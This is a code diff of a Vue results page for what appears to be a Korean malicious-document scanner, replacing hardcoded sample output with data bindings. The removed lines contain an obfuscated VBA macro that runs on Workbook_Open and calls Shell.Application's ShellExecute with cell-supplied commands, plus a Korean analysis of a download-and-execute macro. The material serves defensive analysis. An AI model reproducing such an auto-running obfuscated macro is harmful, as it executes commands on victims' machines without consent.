@@ -60,8 +60,7 @@
               class="text-body2 q-my-md font analysis-c"
               style="font-weight: 400; background-color: #e8eaf6"
             >
-              파일명 : secmali 예시 파일.hwp<br />1. 매크로 발견<br />2.
-              의심스러운 실행 파일 발견
+              <p id="matched">{{ resultData.matched_rules.join(', ') }}</p>
             </div>
             <div
               class="text-h6 q-mb-md font analysis-t"
@@ -73,27 +72,7 @@
               class="text-body2 q-my-md font2 analysis-c"
               style="font-weight: 400; background-color: #e8eaf6"
             >
-              Private Sub Workbook_Open()<br />Dim g5 As String<br />Dim g6 As
-              String<br /><br />g5 = ""<br />g6 = ""<br /><br />g5 = Cells(2, 7)
-              // $g$2<br />g6 = Cells(3, 7) // $g$3<br /><br />lyDdMyWVp =
-              wJmdrV(g5, g6)<br /><br />End Sub<br /><br />Function wJmdrV(eeeew
-              As String, ifgkdfg As String)<br /><br />Dim DGjG() As Variant<br />
-              ReDim DGjG(4)<br />
-              DGjG(0) = "p" + ifgkdfg<br />
-              DGjG(1) = "ping google.com;" + eeeew<br />
-              DGjG(2) = ""<br />
-              DGjG(3) = ""<br />
-              DGjG(4) = 0<br />Dim sSVno As Object<br /><br />Set sSVno =
-              CreateObject(invuKAT())<br /><br />zsEd = CallByName(sSVno,
-              RijxuydD(" S h e l l E x e c u t e "), VbMethod, DGjG(0), DGjG(1),
-              DGjG(2), DGjG(3), DGjG(4))<br /><br />End Function<br /><br />Function
-              invuKAT()<br />invuKAT = RijxuydD("S h e l l . A p p l i c a t i o
-              n")<br />End Function<br /><br />Function RijxuydD(wjkwer)<br />newStr
-              = ""<br />For i = 1 To Len(wjkwer)<br />
-              char = Mid(wjkwer, i, 1)<br />
-              If (char &lt;&gt; " ") Then<br />
-              newStr = newStr + Mid(wjkwer, i, 1)<br />
-              End If<br />Next<br />RijxuydD = newStr<br />End Function
+              <p id="macro">{{ resultData.macros.map(macro => macro.vba_code).join(', ') }}</p>
             </div>
             <div
               class="text-h6 q-mb-md font analysis-t"
@@ -105,20 +84,7 @@
               class="text-body2 q-my-md font analysis-c"
               style="font-weight: 400; background-color: #e8eaf6"
             >
-              이 코드는 Microsoft Word 문서를 열 때 특정 동작을 수행하는 VBA
-              (Visual Basic for Applications) 코드입니다.<br /><br />Document_Open()은
-              문서가 열릴 때 실행되는 매크로입니다. 이 함수 내에서는 세 가지
-              함수인 asfwefsadfasfsadf(), asfwqfasfsdafas(), eifhhdfasfiedf()를
-              호출합니다.<br /><br />asfwefsadfasfsadf() 함수는 현재 선택된
-              문자를 삭제합니다.<br /><br />asfwqfasfsdafas() 함수는 전체 문서를
-              선택하고, 선택된 텍스트의 글꼴을 숨깁니다.<br /><br />eifhhdfasfiedf()
-              함수는 가장 복잡한 부분으로, Shell.Application 객체를 생성하고,
-              특정 스크립트를 실행합니다. 이 스크립트는 웹에서 파일을
-              다운로드하고 실행하는 것으로 보입니다. 그러나 “tuwhn” 문자열을
-              제거하면 실제 URL과 스크립트 내용을 확인할 수 있습니다.<br /><br />이
-              코드는 사용자의 동의 없이 파일을 다운로드하고 실행하므로, 보안상
-              위험할 수 있습니다. 항상 신뢰할 수 있는 소스에서 코드를 가져오고,
-              코드가 무엇을 하는지 이해하기 전에는 실행하지 않는 것이 좋습니다.
+              <p id="analysis_rsult">{{ resultData.macro_analysis }}</p>
             </div>
           </div>
         </div>
@@ -141,7 +107,7 @@ import { defineComponent, ref, onMounted, onUnmounted } from "vue";
 
 export default defineComponent({
   name: "ResultPage",
-  setup() {
+  setup(props) {
     const wrapElement = ref(null);
     const contentElement = ref(null);
 
@@ -184,7 +150,8 @@ export default defineComponent({
     return {
       addScrolledClass,
       wrapElement,
-      contentElement
+      contentElement,
+      resultData: props.route.params.data, // upload 페이지에서 전달된 데이터 사용
     };
   },
 });
